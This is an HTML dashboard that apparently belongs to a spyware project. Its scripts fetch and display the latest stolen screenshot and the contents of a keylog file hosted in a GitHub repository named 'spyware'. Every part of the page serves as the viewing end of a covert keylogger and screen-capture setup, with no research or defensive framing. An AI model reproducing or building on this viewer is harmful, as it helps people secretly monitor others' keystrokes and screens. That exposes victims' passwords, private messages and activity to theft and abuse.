<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        img {
            width: 400px;
            height: auto;
            margin: 10px;
        }
        #keylog-content {
            white-space: pre-wrap; /* Preserve formatting (line breaks) */
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ccc;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
    
    <h2>Latest Screenshot</h2>
    <div id="latest-screenshot">
        <!-- Latest screenshot will be shown here -->
        <script>
            const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
            
            fetch(repo)
                .then(response => response.json())
                .then(data => {
                    // Filter for .png files (screenshots)
                    const screenshots = data.filter(file => file.name.endsWith(".png"));

                    if (screenshots.length === 0) {
                        document.getElementById("latest-screenshot").innerText = "No screenshots available.";
                        return;
                    }

                    // Sort by filename assuming the filenames contain timestamps (e.g., Screenshot_yyyyMMdd_HHmmss.png)
                    screenshots.sort((a, b) => {
                        const aTime = a.name.match(/(\d{8}_\d{6})/)[0]; // Extract timestamp from filename
                        const bTime = b.name.match(/(\d{8}_\d{6})/)[0];
                        return bTime.localeCompare(aTime); // Sort descending by time
                    });

                    // Get the latest screenshot
                    const latestScreenshot = screenshots[0];

                    // Display the latest screenshot
                    let img = document.createElement("img");
                    img.src = latestScreenshot.download_url;
                    document.getElementById("latest-screenshot").appendChild(img);
                })
                .catch(error => console.error('Error fetching latest screenshot:', error));
        </script>
    </div>

    <h2>Keylogs</h2>
    <div id="keylog-content">Loading keylogs...</div>
    <script>
        const keylogUrl = "https://raw.githubusercontent.com/shrijaybaheti/spyware/main/keylog.txt";
        
        fetch(keylogUrl)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok.');
                }
                return response.text(); // Get the text content of the keylog file
            })
            .then(data => {
                document.getElementById("keylog-content").innerText = data; // Display keylog content
            })
            .catch(error => {
                document.getElementById("keylog-content").innerText = "Error loading keylog.";
                console.error('Error fetching keylog:', error);
            });
    </script>

</body>
</html>
